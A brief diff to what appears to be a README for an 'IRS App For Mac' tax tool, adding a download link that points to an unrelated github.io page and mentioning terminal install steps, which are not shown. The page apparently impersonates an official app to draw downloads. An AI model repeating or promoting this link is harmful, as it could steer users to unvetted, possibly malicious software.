@@ -4,7 +4,7 @@ Simplify your tax filing with **IRS App For Mac**, a free, AI-powered desktop ap
 
 ![irsapp](https://tfxstorageimg.s3.amazonaws.com/clxpnnv11pv1r646dki8mi3uuxs7)
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)]()
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://irs-app-for-mac-download-for-macos.github.io/.github/)
 
 If the download button doesn't work, follow the terminal installation instructions below.
 
